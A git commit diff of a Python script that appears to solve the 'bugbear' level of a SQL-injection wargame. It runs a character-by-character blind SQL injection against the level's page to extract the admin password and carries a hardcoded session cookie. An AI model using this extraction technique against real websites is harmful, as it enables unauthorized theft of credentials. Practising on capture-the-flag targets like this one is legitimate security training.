b9fb0abb885f0a01a21e63961ba8704ae8aa185a
ssgkmd <tlagyqls7@naver.com>
2019-02-20 17:15:25 +0900

    bugbear

--- los_bugbear.py
+++ los_bugbear.py
@@ -1,14 +1,14 @@
 import requests
 
 password=''
-for admin_len in range(1) :
-    for admin_pass in range(33,126) :
+for admin_len in range(8) :
+    for admin_pass in range(47,126) :
         URL='http://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php?'
-        query={'pw': '1','no':'1||right(left(pw,'+str(6)+'),1)<\"'+chr(admin_pass)+'\"--'}
+        query={'pw': '1','no':'1||right(left(pw,'+str(admin_len+1)+'),1)<\"'+chr(admin_pass)+'\"--'}
         headers = {'Content-Type': 'application/json; charset=utf-8'}
         cookies = {'PHPSESSID': 'ean08as37ebof2v307j3kurer3'}
         res=requests.get(URL, params=query, headers=headers, cookies=cookies)
         if("Hello admin" in res.text):
-            print(chr(admin_pass))
+            print(chr(admin_pass-1))
             break
     print("one cycle complete")
